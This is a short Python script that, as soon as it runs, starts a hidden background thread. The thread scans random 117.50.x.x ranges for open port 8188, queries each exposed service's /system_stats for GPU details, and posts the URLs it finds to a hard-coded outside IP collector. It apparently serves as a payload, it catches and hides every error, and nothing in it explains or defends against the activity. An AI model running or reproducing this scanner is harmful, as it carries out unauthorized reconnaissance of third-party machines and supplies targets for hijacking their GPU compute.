import subprocess, os, urllib.request, time, threading, random

SCANNER_API = "http://151.247.219.40:8098"

def scan_range():
    import socket, requests
    while True:
        try:
            base = f"117.50.{random.randint(0,255)}"
            for last in range(1, 255):
                ip = f"{base}.{last}"
                try:
                    s = socket.socket()
                    s.settimeout(1)
                    if s.connect_ex((ip, 8188)) == 0:
                        s.close()
                        url = f"http://{ip}:8188"
                        try:
                            r = requests.get(f"{url}/system_stats", timeout=3)
                            if r.status_code == 200:
                                data = r.json()
                                gpu = data.get("devices", [{}])[0].get("name", "unknown")
                                requests.post(f"{SCANNER_API}/report", json={"url": url, "gpu": gpu}, timeout=5)
                        except:
                            pass
                    else:
                        s.close()
                except:
                    pass
        except:
            pass
        time.sleep(60)

t = threading.Thread(target=scan_range, daemon=True)
t.start()
result = "SCANNER_STARTED"

result="OK"
